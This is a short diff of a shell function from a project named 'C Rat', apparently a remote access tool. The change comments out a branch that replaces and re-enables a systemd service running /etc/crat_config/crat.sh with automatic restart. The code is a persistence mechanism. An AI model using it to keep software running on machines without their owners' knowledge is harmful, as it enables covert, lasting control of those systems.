@@ -44,25 +44,25 @@ registerDaemon () {
 
       sudo systemctl start crat_daemon.service
       sudo systemctl enable crat_daemon.service
-  else 
-    # if crat_daemon.service is already in /etc/systemd/system/ remove the old one and add the new one
-    sudo systemctl stop crat_daemon.service
-    sudo systemctl disable crat_daemon.service
-    sudo rm /etc/systemd/system/crat_daemon.service
-    echo "[Unit]
-        Description=C Rat service
-        After=network.target
+  # else 
+  #   # if crat_daemon.service is already in /etc/systemd/system/ remove the old one and add the new one
+  #   sudo systemctl stop crat_daemon.service
+  #   sudo systemctl disable crat_daemon.service
+  #   sudo rm /etc/systemd/system/crat_daemon.service
+  #   echo "[Unit]
+  #       Description=C Rat service
+  #       After=network.target
 
-        [Service]
-        ExecStart=/bin/bash /etc/crat_config/crat.sh
-        Restart=always
-        RestartSec=4
+  #       [Service]
+  #       ExecStart=/bin/bash /etc/crat_config/crat.sh
+  #       Restart=always
+  #       RestartSec=4
 
-        [Install]
-        WantedBy=multi-user.target" >> /etc/systemd/system/crat_daemon.service
+  #       [Install]
+  #       WantedBy=multi-user.target" >> /etc/systemd/system/crat_daemon.service
 
-    sudo systemctl start crat_daemon.service
-    sudo systemctl enable crat_daemon.service
+  #   sudo systemctl start crat_daemon.service
+  #   sudo systemctl enable crat_daemon.service
   fi
 }
 
